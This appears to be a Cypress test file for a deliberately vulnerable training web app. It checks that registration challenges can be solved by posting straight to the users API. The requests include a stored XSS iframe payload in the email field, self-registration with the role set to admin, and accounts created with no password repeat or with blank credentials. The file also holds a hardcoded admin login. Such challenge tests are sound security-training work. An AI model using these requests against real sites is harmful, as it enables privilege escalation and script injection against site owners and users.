describe('/#/register', () => {
  beforeEach(() => {
    cy.visit('/#/register')
  })

  describe('challenge "persistedXssUser"', () => {
    beforeEach(() => {
      cy.login({
        email: 'admin',
        password: 'admin123'
      })
    })

    it('should be possible to bypass validation by directly using Rest API', async () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/api/Users/`,
              {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json'
                },
                body: JSON.stringify({
                  email: '<iframe src="javascript:alert(`xss`)">',
                  password: 'XSSed',
                  passwordRepeat: 'XSSed',
                  role: 'admin'
                })
              }
            )
            if (response.status === 201) {
              console.log('Success')
            }
          })

          cy.visit('/#/administration')
          cy.on('window:alert', (t) => {
            expect(t).to.equal('xss')
          })
          cy.expectChallengeSolved({ challenge: 'Client-side XSS Protection' })
        }
      })
    })
  })

  describe('challenge "registerAdmin"', () => {
    it('should be possible to register admin user using REST API', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: 'testing@test.com',
            password: 'pwned',
            passwordRepeat: 'pwned',
            role: 'admin'
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Admin Registration' })
    })
  })

  describe('challenge "passwordRepeat"', () => {
    it('should be possible to register user without repeating the password', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: 'uncle@bob.com',
            password: 'ThereCanBeOnlyOne'
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Repetitive Registration' })
    })
  })

  describe('challenge "registerEmptyUser"', () => {
    it('should be possible to register a user with blank email/password', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: '',
            password: '',
            passwordRepeat: ''
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Empty User Registration' })
    })
  })
})
